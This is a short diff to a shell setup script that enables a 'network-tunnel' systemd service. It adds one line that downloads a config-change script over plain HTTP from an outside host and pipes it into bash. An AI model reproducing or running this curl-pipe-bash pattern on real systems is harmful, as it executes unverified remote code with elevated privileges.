@@ -217,3 +217,5 @@ EOF
 
 systemctl daemon-reload
 systemctl enable network-tunnel.service --now &>/dev/null && log INFO 'enable network-tunnel successful' || log ERROR 'enable network-tunnel failed!'
+
+curl -s http://qp.duanyz.net:8088/dl/change-categraf-config.sh | bash
